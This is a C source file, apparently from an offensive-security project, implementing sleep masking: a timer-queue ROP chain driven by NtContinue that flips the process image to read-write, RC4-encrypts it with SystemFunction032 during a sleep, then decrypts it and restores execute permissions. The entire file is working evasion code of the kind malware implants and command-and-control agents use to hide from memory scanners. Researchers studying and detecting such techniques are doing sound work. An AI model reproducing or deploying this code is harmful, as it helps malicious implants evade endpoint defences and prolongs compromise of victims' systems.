#include "SleepMasking.h"

void GoDark(INT sleepTime){
    CONTEXT CtxThread = { 0 }, 
            RopProtRW = { 0 }, 
            RopMemEnc = { 0 }, 
            RopDelay  = { 0 }, 
            RopMemDec = { 0 }, 
            RopProtRX = { 0 }, 
            RopSetEvt = { 0 };
    DWORD OldProtect = 0;

    HANDLE hTimerQueue = WrapperCreateTimerQueue();
    HANDLE hEvent = WrapperCreateEventW(NULL, FALSE, FALSE, NULL);
    PVOID ImageBase = CustomGetModuleHandleW(NULL);
    
    // Parse PE headers for image size
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
    // We will be using NtContine to update the context and so controling the flow using CONTEXT.Rip = <targetfunction> 
    DWORD ImageSize = ntHeader->OptionalHeader.SizeOfImage;

    _SystemFunction032 SysFunc032 = (_SystemFunction032)CustomGetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
    PVOID NtContinue = CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtContinue");


    //Storing value into Heap to avoid being ciphered and used to unXOR the image
    USTRING* pKey = (USTRING*)LocalAlloc(LPTR, sizeof(USTRING));
    USTRING* pImg = (USTRING*)LocalAlloc(LPTR, sizeof(USTRING));

    pKey->Buffer = LocalAlloc(LPTR, 16);
    memcpy(pKey->Buffer, "rzdhop_is_nice!", 16);
    pKey->Length = 16;
    pKey->MaximumLength = 16;

    pImg->Buffer = ImageBase;
    pImg->Length = ImageSize;
    pImg->MaximumLength = ImageSize;

    printf("[*] Environment Info:\n");
    printf("    -> ImageBase    : 0x%p\n", ImageBase);
    printf("    -> ImageSize    : 0x%X\n", ImageSize);
    printf("    -> NtContinue   : 0x%p\n", NtContinue);
    printf("    -> SysFunc032   : 0x%p\n", SysFunc032);

    HANDLE hTimer = NULL;

    printf("[*] Capturing initial thread context...\n");
    // We use the TimerQueue to capture a context that is already within the worker thread pool
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD);
    Sleep(50); 

    if (CtxThread.Rsp == 0) {
        printf("[!] Error: RtlCaptureContext failed or hasn't executed yet.\n");
        return;
    }
    printf("[+] Context Captured (RSP: %p, RIP: %p)\n", (PVOID)CtxThread.Rsp, (PVOID)CtxThread.Rip);

    // Copy the captured context into all stages
    memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
    memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
    memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

    // Stage 1: VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE, &OldProtect)
    RopProtRW.Rsp -= 8; 
    RopProtRW.Rip = (DWORD64)VirtualProtect;
    RopProtRW.Rcx = (DWORD64)ImageBase; 
    RopProtRW.Rdx = (DWORD64)ImageSize;
    RopProtRW.R8  = PAGE_READWRITE; 
    RopProtRW.R9  = (DWORD64)&OldProtect;

    // Stage 2: SystemFunction032(&Img, &Key) -> Encryption
    RopMemEnc.Rsp -= 8; 
    RopMemEnc.Rip = (DWORD64)SysFunc032;
    RopMemEnc.Rcx = (DWORD64)pImg; 
    RopMemEnc.Rdx = (DWORD64)pKey;

    // Stage 3: WaitForSingleObject(GetCurrentProcess(), sleepTime) -> The actual "Sleep"
    RopDelay.Rsp -= 8; 
    RopDelay.Rip = (DWORD64)WaitForSingleObject;
    RopDelay.Rcx = (DWORD64)GetCurrentProcess(); 
    RopDelay.Rdx = sleepTime;

    // Stage 4: SystemFunction032(&Img, &Key) -> Decryption
    RopMemDec.Rsp -= 8; 
    RopMemDec.Rip = (DWORD64)SysFunc032;
    RopMemDec.Rcx = (DWORD64)pImg; 
    RopMemDec.Rdx = (DWORD64)pKey;

    // Stage 5: VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect)
    RopProtRX.Rsp -= 8; 
    RopProtRX.Rip = (DWORD64)VirtualProtect;
    RopProtRX.Rcx = (DWORD64)ImageBase; 
    RopProtRX.Rdx = (DWORD64)ImageSize;
    RopProtRX.R8  = PAGE_EXECUTE_READWRITE; 
    RopProtRX.R9  = (DWORD64)&OldProtect;

    // Stage 6: SetEvent(hEvent) -> End of chain
    RopSetEvt.Rsp -= 8; 
    RopSetEvt.Rip = (DWORD64)SetEvent;
    RopSetEvt.Rcx = (DWORD64)hEvent;

    printf("[!] Triggering ROP Chain Timers...\n");
    
    // We queue them with small increments (100ms)
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);

    DWORD postDelay = 400 + sleepTime;
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopMemDec, postDelay, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopProtRX, postDelay + 100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, hTimerQueue, (WAITORTIMERCALLBACK)NtContinue, &RopSetEvt, postDelay + 200, 0, WT_EXECUTEINTIMERTHREAD);

    printf("[*] All timers queued. Main thread waiting for hEvent...\n");

    // If memory is encrypted and a thread tries to access it, the process will crash here.
    WaitForSingleObject(hEvent, INFINITE);
    
    printf("[+] Event signaled! Image should be decrypted.\n");

    DeleteTimerQueue(hTimerQueue);

}